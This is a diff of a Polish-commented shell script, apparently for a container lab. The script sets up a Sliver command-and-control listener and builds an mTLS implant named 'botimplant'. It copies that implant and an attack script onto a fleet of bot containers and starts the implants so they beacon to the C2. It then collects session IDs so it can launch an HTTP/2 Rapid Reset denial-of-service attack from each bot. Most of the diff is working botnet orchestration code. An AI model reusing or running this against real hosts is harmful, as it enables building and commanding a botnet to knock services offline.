@@ -55,16 +55,20 @@ sleep 12
 say "listener mTLS :$LPORT"
 send "mtls --lport $LPORT"; sleep 5
 
-# --- 2. implant (reuse cache albo zbuduj) ---
-if [ -f "$C2DATA/botimplant" ]; then
-  say "implant z cache: c2/data/botimplant"
+# --- 2. implant: zbuduj W KONTENERZE c2, wyciagnij przez `docker cp`
+#     (omija prawa hosta do zamontowanego c2/data — plik jest root-owned) ---
+IMPL_C2="/root/.sliver/botimplant"
+if docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null; then
+  say "implant juz istnieje w kontenerze c2"
 else
   say "generuję implanta linux (Go build — to potrwa, max ${BUILD_TIMEOUT}s)"
-  send "generate --mtls $C2:$LPORT --os linux --skip-symbols --name botimplant --save /root/.sliver/botimplant"
-  t=0; while [ ! -f "$C2DATA/botimplant" ] && [ $t -lt "$BUILD_TIMEOUT" ]; do sleep 5; t=$((t+5)); [ $((t%30)) -eq 0 ] && say "  ...build ${t}s"; done
+  send "generate --mtls $C2:$LPORT --os linux --skip-symbols --name botimplant --save $IMPL_C2"
+  t=0; while ! docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null && [ $t -lt "$BUILD_TIMEOUT" ]; do sleep 5; t=$((t+5)); [ $((t%30)) -eq 0 ] && say "  ...build ${t}s"; done
 fi
-[ -f "$C2DATA/botimplant" ] || { say "BŁĄD: implant nie zbudowany w ${BUILD_TIMEOUT}s (podnieś BUILD_TIMEOUT / użyj mocniejszego CPU)"; exit 1; }
-say "implant gotowy ($(wc -c < "$C2DATA/botimplant") B)"
+docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null || { say "BŁĄD: implant nie zbudowany w ${BUILD_TIMEOUT}s (podnieś BUILD_TIMEOUT)"; exit 1; }
+docker cp "$C2:$IMPL_C2" /tmp/botimplant >/dev/null 2>&1
+chmod +x /tmp/botimplant 2>/dev/null
+say "implant gotowy ($(wc -c < /tmp/botimplant) B)"
 
 # --- 3. skrypt ataku dla botów (Rapid Reset w pętli, w tle) ---
 cat > /tmp/c2_attack.sh <<'ATK'
@@ -77,23 +81,24 @@ sed -i "s|__TARGET__|$TARGET|g; s|__DUR__|$DURATION|g" /tmp/c2_attack.sh
 # --- 4. deploy implanta + ataku na flotę, uruchom implanty ---
 say "deploy na flotę lab-bot1..$FLEET i start implantów"
 for b in $(seq 1 "$FLEET"); do
-  docker cp "$C2DATA/botimplant" "lab-bot$b:/implant"  >/dev/null 2>&1
+  docker cp /tmp/botimplant      "lab-bot$b:/implant"  >/dev/null 2>&1
   docker cp /tmp/c2_attack.sh    "lab-bot$b:/attack.sh" >/dev/null 2>&1
   docker exec "lab-bot$b" chmod +x /implant /attack.sh 2>/dev/null
   docker exec -d "lab-bot$b" /implant                  # implant beaconuje do c2 (mTLS)
 done
 
 # --- 5. czekaj na sesje ---
+# Wiersz sesji w tabeli Sliver ma ID (8 hex) w 1. kolumnie i transport 'mtls'.
 say "czekam na sesje implantów..."
-t=0; NSESS=0
-while [ $t -lt 60 ]; do
+t=0; IDS=""
+while [ $t -lt 90 ]; do
   send "sessions"; sleep 3
-  NSESS=$(sout | awk '/botimplant|session|mtls/{c++} END{print c+0}')
-  IDS=$(sout | grep -iE 'botimplant' | awk '{print $1}' | grep -E '^[0-9a-fA-F-]{6,}$' | sort -u)
-  [ -n "$IDS" ] && { NSESS=$(echo "$IDS" | wc -w); break; }
+  IDS=$(sout | grep -i 'mtls' | awk '{print $1}' | grep -iE '^[0-9a-f]{8}$' | sort -u)
+  [ -n "$IDS" ] && break
   t=$((t+5)); sleep 2
 done
-say "sesje: $(echo "${IDS:-}" | wc -w)"
+NSESS=$(echo "${IDS:-}" | grep -c .)
+say "sesje: $NSESS"
 
 # --- 6. execute Rapid Reset na każdej sesji (atak z C2) ---
 if [ -n "${IDS:-}" ]; then
